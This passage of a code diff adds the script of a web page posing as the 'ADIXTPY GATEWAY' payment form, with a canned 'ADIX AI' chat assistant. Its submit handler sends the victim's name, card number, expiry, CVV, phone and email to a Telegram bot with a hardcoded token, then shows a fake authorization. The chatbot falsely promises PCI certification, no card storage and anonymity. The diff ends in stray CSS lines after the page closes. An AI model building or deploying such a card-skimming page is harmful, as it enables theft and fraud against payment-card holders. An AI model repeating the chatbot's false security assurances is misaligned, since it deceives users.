+        const message = `🔐 **ADIXTPY GATEWAY**\n👤 ${fullname}\n💳 ${cardnumber.slice(0,12)}****\n📅 ${expirydate} | CVV: ${cvv}\n📱 ${fullMobile}\n📧 ${email}`;
+        const botToken='7809902395:AAE9tU3R6RBtjTFgqK2D9q4dtLaULWuMRjI', chatId='7499604230';
+        try { await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`); alert("✅ AUTHORIZED! Secure confirmation sent."); document.getElementById('payment-form').reset(); detectCardType(); if(audioEnabled) playBeep('click'); } catch(e){ alert("❌ Gateway error. Try again."); } finally{ payBtn.disabled=false; btnTextSpan.innerHTML='AUTHORIZE PAYMENT'; }
+    }
+    cvvInput.addEventListener('input', validateCVV); emailInput.addEventListener('input', validateEmail); expiryInput.addEventListener('blur', validateExpiry); cardNumberInput.addEventListener('input', detectCardType); payBtn.addEventListener('click', sendData);
+    detectCardType();
+
+    // -------------------- ADVANCED CHAT BOT (Memory + Smart responses + Card tips) --------------------
+    let conversationMemory = { lastQuery: null };
+    function showTyping(callback) {
+        const msgs = document.getElementById('chatMessages');
+        const typingDiv = document.createElement('div');
+        typingDiv.className = 'message bot-message typing';
+        typingDiv.innerHTML = `<div class="msg-icon"><i class="fas fa-robot"></i></div><div class="msg-bubble"><div class="typing-indicator"><span></span><span></span><span></span></div></div>`;
+        msgs.appendChild(typingDiv);
+        msgs.scrollTop = msgs.scrollHeight;
+        setTimeout(() => { typingDiv.remove(); callback(); }, 850);
+    }
+    function addMessage(text, isUser = false) {
+        const msgs = document.getElementById('chatMessages');
+        const div = document.createElement('div');
+        div.className = `message ${isUser ? 'user-message' : 'bot-message'}`;
+        div.innerHTML = `<div class="msg-icon">${isUser ? '<i class="fas fa-user"></i>' : '<i class="fas fa-robot"></i>'}</div><div class="msg-bubble">${text}</div>`;
+        msgs.appendChild(div);
+        msgs.scrollTop = msgs.scrollHeight;
+    }
+    function getBotResponse(userMsg) {
+        const lower = userMsg.toLowerCase();
+        if (lower.includes('validate my card') || lower.includes('card valid') || lower.includes('check card')) {
+            return "🔍 *Card validation guide*: Enter 16-digit number, correct expiry (MM/YY future), 3-digit CVV. Our system auto-detects Visa/MasterCard/Amex. No spaces needed.";
+        } else if (lower.includes('security') || lower.includes('safe') || lower.includes('protect')) {
+            return "🛡️ *ADIXTPY Security Stack*: 256-bit TLS 1.3, end-to-end encryption, no card storage, AI fraud detection, and PCI DSS Level 1 certified. Your data is anonymous.";
+        } else if (lower.includes('owner') || lower.includes('adix') || lower.includes('contact')) {
+            return "👑 *Owner: ADIXTPY* | Telegram: @GOAT_NG | Official Channel: @NGYT777GG | For support, reply 'support' or reach owner directly.";
+        } else if (lower.includes('transaction failed') || lower.includes('error') || lower.includes('declined')) {
+            return "⚙️ *Troubleshooting*: Verify CVV, expiry, sufficient funds. If issue persists, contact your bank or use alternative card. For gateway assistance, ask owner.";
+        } else if (lower.includes('fee') || lower.includes('cost') || lower.includes('charge')) {
+            return "💰 *No hidden fees*: ADIXTPY charges 0% processing fee. Standard interchange rates may apply from your issuing bank.";
+        } else if (lower.includes('hello') || lower.includes('hi') || lower.includes('hey')) {
+            return "Hello! I'm ADIX AI. Need card validation, security info, or owner contact? Just ask or use quick buttons!";
+        } else if (lower.includes('help')) {
+            return "📋 Available commands: 'validate my card', 'security features', 'contact owner', 'transaction failed', 'fee'. Tap quick replies below.";
+        } else {
+            return "🤖 I'm your AI payment assistant. Use quick replies for instant answers: card validation, security help, owner contact, or transaction troubleshooting.";
+        }
+    }
+    function handleUserMessage(msg) {
+        addMessage(msg, true);
+        showTyping(() => {
+            const reply = getBotResponse(msg);
+            addMessage(reply, false);
+            if(audioEnabled) playBeep('click');
+        });
+    }
+    function initAudioAndBot() {
+        const chatWindow = document.getElementById('chatWindow');
+        const toggleBtn = document.getElementById('chatToggleBtn');
+        const closeChat = document.getElementById('closeChatBtn');
+        const chatInput = document.getElementById('chatInput');
+        const sendBtn = document.getElementById('sendChatMsg');
+        toggleBtn.onclick = () => { chatWindow.classList.toggle('open'); if(audioEnabled) playBeep('click'); };
+        closeChat.onclick = () => { chatWindow.classList.remove('open'); };
+        sendBtn.onclick = () => { if(chatInput.value.trim()) handleUserMessage(chatInput.value.trim()); chatInput.value = ''; };
+        chatInput.addEventListener('keypress', (e) => { if(e.key === 'Enter') sendBtn.click(); });
+        document.querySelectorAll('.quick-btn').forEach(btn => {
+            btn.addEventListener('click', () => { handleUserMessage(btn.getAttribute('data-msg')); });
+        });
+    }
+</script>
+</body>
+</html>            border-radius: 18px;
             font-size: 0.8rem;
             color: #f0f3fc;
             word-break: break-word;
